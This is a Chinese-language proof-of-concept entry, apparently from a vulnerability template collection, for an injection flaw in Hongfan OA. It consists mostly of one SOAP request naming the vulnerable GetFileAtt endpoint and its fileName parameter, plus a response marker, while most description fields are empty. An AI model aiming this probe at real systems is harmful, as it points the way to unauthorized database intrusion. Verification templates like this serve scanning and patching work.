﻿# 红帆 OA 注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetFileAtt"
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></soap:Envelope>
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：红帆 OA 注入.poc
